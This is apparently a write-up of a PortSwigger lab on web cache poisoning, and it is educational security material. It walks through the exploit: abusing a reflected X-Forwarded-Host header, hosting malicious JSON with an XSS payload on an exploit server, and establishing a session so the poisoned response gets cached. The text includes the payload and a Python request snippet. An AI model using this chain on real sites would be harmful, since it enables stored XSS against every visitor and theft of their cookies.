# Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

**Category:** Web Cache Poisoning
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

Every lab so far assumed the cache would happily store whatever we handed it, and the only real question was which input it stored unkeyed. This lab starts from a cache that's actually somewhat well-defended — it refuses to store any response carrying a `Set-Cookie` header — and the interesting part of solving it is realizing that "strict cacheability criteria" doesn't stop the poisoning, it just changes what has to happen before the poisoned response is even eligible to be cached at all.

## The Target

The home page includes an inline script that reads a `data.host` value and passes it into `initGeoLocate()`, which fetches a JSON document from that host and writes a `country` property from the response straight into the DOM.

## The Investigation

`X-Forwarded-Host` turned out to be reflected again, this time controlling `data.host` directly rather than a resource-import URL:

```javascript
initGeoLocate('//' + data.host + '/resources/json/geolocate.json')
```

`initGeoLocate` fetches whatever JSON that URL returns and writes its `country` field into the page via `innerHTML` — a DOM XSS sink, provided we can control the JSON content and get the browser to fetch it cross-origin, which means the response needs `Access-Control-Allow-Origin: *`.

The complication was the cache's stricter behavior. A first request — before any session cookie exists — comes back with a `Set-Cookie` header attached, and responses carrying `Set-Cookie` are explicitly excluded from caching here. Only a *subsequent* request, made with the session cookie already established, comes back without `Set-Cookie` and becomes eligible for caching. `httpx`'s built-in cookie jar handles this transparently across requests within the same client session, so the practical fix was simply making sure our poisoning requests reused a persistent client rather than firing one-off requests that might each look like a fresh, uncacheable, cookie-setting visit.

## The Exploit

We hosted a malicious JSON document on the exploit server with the required CORS header:

```python
xss_payload = "<img src=1 onerror=alert(document.cookie)>"
malicious_json = json.dumps({"country": xss_payload})
```

stored at `/resources/json/geolocate.json` with `Content-Type: application/json` and `Access-Control-Allow-Origin: *`. Then we poisoned the home page cache using `X-Forwarded-Host` pointed at the exploit server:

```python
r = await client.get(lab_url, headers={"X-Forwarded-Host": exploit_host})
```

repeating the request within the same client session (so the session cookie was already established and the response qualified for caching), checking each response for `X-Cache: miss` alongside the exploit host actually appearing in the `data.host` value, and confirming persistence with a follow-up clean request. Once poisoned, any visitor loading the home page executes `initGeoLocate()` against our exploit server, fetches our malicious JSON cross-origin, and `innerHTML`-injects the `<img onerror=...>` payload straight into the page.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the identical chain: use Param Miner to confirm `X-Forwarded-Host` is supported, observe it overwrites `data.host` feeding into `initGeoLocate()`, inspect `/resources/js/geolocate.js` to confirm the DOM-XSS sink, host a malicious `geolocate.json` with the CORS header and the `<img src=1 onerror=alert(document.cookie)>` payload on the exploit server, and poison the home page cache — explicitly noting that a response containing `Set-Cookie` won't be cached, so the poisoning request needs an established session first.

This is a case of exact technique convergence with no interesting divergence in the exploitation itself — the mechanism is identical down to the payload. The one place worth flagging is purely a tooling difference: PortSwigger's walkthrough handles the "session must already exist before the cache will store the response" requirement by simply loading the page normally in a browser first (which sets the cookie), then switching to Repeater for the poisoning requests. Our script gets the same guarantee for free from `httpx`'s cookie jar automatically persisting the session cookie across requests inside a single client context — no manual sequencing needed, just making sure we didn't accidentally spin up a fresh client per request.

## What This Teaches Us

"Strict cacheability criteria" — refusing to cache anything carrying `Set-Cookie` — is a real and generally sound mitigation against a specific class of problem: it stops a cache from accidentally serving one user's session-specific response to another user. It says nothing at all about whether a response that *does* qualify for caching is safe to serve to everyone, and this lab is proof that those are two entirely separate properties. The DOM XSS sink here didn't care whether the cache was strict or permissive — it only needed one successfully cached response, established the same way a legitimate user's second page load would establish it, to become a stored vulnerability reachable by anyone.
